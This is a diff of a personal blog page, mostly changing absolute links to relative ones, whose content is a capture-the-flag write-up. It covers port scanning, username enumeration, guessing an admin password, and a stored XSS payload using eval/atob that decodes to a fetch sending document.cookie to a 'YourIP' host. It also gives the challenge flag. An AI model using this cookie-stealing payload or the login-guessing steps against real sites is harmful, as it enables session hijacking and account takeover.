@@ -104,15 +104,15 @@ apart from that we can find an interesting banner at the top of the site with so
     
 
     <link rel="canonical" href="https://novaclearnscyber.github.io/blog/posts/farewell/">
-    <link href="https://novaclearnscyber.github.io/blog/style.min.e390ba7da26222f4dc42a349955d76dbbe44e5ce2535a43de5a70633a0a9ec3c.css" rel="stylesheet">
-    <link href="https://novaclearnscyber.github.io/blog/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+    <link href="/blog/style.min.e390ba7da26222f4dc42a349955d76dbbe44e5ce2535a43de5a70633a0a9ec3c.css" rel="stylesheet">
+    <link href="/blog/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
     
-    <link rel="apple-touch-icon" sizes="180x180" href="https://novaclearnscyber.github.io/blog/icons/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="https://novaclearnscyber.github.io/blog/icons/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="https://novaclearnscyber.github.io/blog/icons/favicon-16x16.png">
-    <link rel="mask-icon" href="https://novaclearnscyber.github.io/blog/icons/safari-pinned-tab.svg">
-    <link rel="shortcut icon" href="https://novaclearnscyber.github.io/blog/favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="/blog/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/blog/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/blog/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/blog/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/blog/favicon.ico">
 
 
 
@@ -125,14 +125,14 @@ apart from that we can find an interesting banner at the top of the site with so
     <meta name="color-scheme" content="light dark">
 
     
-    <link rel="icon" type="image/svg+xml" href="https://novaclearnscyber.github.io/blog/icons/favicon.svg">
+    <link rel="icon" type="image/svg+xml" href="/blog/icons/favicon.svg">
 
     
     
     
       
-<link rel="icon" type="image/png" href="https://novaclearnscyber.github.io/blog/favicon.png">
-<link rel="shortcut icon" href="https://novaclearnscyber.github.io/blog/favicon.png">
+<link rel="icon" type="image/png" href="/favicon.png">
+<link rel="shortcut icon" href="/favicon.png">
     
 </head>
 
@@ -150,6 +150,16 @@ stroke-linejoin="round" class="feather feather-home">
 </svg>
         </a>
     </div>
+    
+    <ul class="menu">
+        
+        <li>
+            <a href="/blog/categories/">
+                Categories
+            </a>
+        </li>
+        
+    </ul>
     
 </nav>
 
@@ -207,33 +217,33 @@ lets scna the ports with nmap and sS flag for<br>
 -sS means Half-Open scan , is a scan quite fast and silent scan which scans for TCP SYN<br>
 <a href="https://en.wikipedia.org/wiki/Transmission">https://en.wikipedia.org/wiki/Transmission</a>_Control_Protocol<br>
 <a href="https://en.wikipedia.org/wiki/SYN">https://en.wikipedia.org/wiki/SYN</a></p>
-<p><img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260118094415.png" alt=""><br>
+<p><img src="/images/blog-ul-meu/static/Pasted%20image%2020260118094415.png" alt=""><br>
 very basiscs ports open , ssh and https , lets check the site</p>
-<p><img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260118094453.png" alt=""><br>
+<p><img src="/images/blog-ul-meu/static/Pasted%20image%2020260118094453.png" alt=""><br>
 nothing interesting here just a basic login page<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260118145315.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260118145315.png" alt=""><br>
 apart from that we can find an interesting banner at the top of the site with some active users , maybe we can try some of the mfor the username</p>
 <p>lets try a basic subdir enumeration maybe something interesting show up</p>
-<p><img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260118100108.png" alt=""><br>
+<p><img src="/images/blog-ul-meu/static/Pasted%20image%2020260118100108.png" alt=""><br>
 ok really good e have some good statussus here</p>
 <p>lets try a burp suite interceptor</p>
-<p><img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260118101550.png" alt=""><br>
+<p><img src="/images/blog-ul-meu/static/Pasted%20image%2020260118101550.png" alt=""><br>
 now lets try to log in with it<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260118102022.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260118102022.png" alt=""><br>
 i catch it and send it to the repeater and we see the error=auth_failed</p>
-<p>trying a username from above and a random pass i get the following <img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260118145649.png" alt=""><br>
+<p>trying a username from above and a random pass i get the following <img src="/images/blog-ul-meu/static/Pasted%20image%2020260118145649.png" alt=""><br>
 lets try some other usernames to<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260118145721.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260118145721.png" alt=""><br>
 ok cool<br>
 lets try also deliver11<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260118145757.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260118145757.png" alt=""><br>
 ok cool , this is the easieste password we can  get<br>
 the capital of japan is Kyoto , so the formal will be KyotoXXXX where X is a digit</p>
 <p>i guess we will try yo bruceforce it</p>
 <p>Reconsidering it , taking in consideration the WAF , the bruteforce for the format XXXX will take quite some time so lets try something for admin</p>
 <p>after a few trying a got lucky and found &ldquo;Farewell2025!&rdquo;</p>
 <p>logining in with that pass we get<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260118150802.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260118150802.png" alt=""><br>
 so there is the flag<br>
 note: this will be the flag for a normal user</p>
 <p>for the second flag we will try same aproach we used for the second WAF ctf , that being using eval and atob functions</p>
@@ -242,11 +252,11 @@ note: this will be the flag for a normal user</p>
 </code></pre><p>where the encodede part is :<br>
 f<code>etch('//YourIP/'+document.cookie)</code></p>
 <p>and by pasting the payload into the post section we get the second cookie just like that</p>
-<p><img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260118152529.png" alt=""></p>
-<p><img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260118152610.png" alt=""><br>
+<p><img src="/images/blog-ul-meu/static/Pasted%20image%2020260118152529.png" alt=""></p>
+<p><img src="/images/blog-ul-meu/static/Pasted%20image%2020260118152610.png" alt=""><br>
 and by changing out cookie with that we get<br>
 note u have the change the cookie in admin.php page</p>
-<p><img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260118153156.png" alt=""></p>
+<p><img src="/images/blog-ul-meu/static/Pasted%20image%2020260118153156.png" alt=""></p>
 <p>FLAG:THM{ADMINP@wned007}</p>
 
             </div>
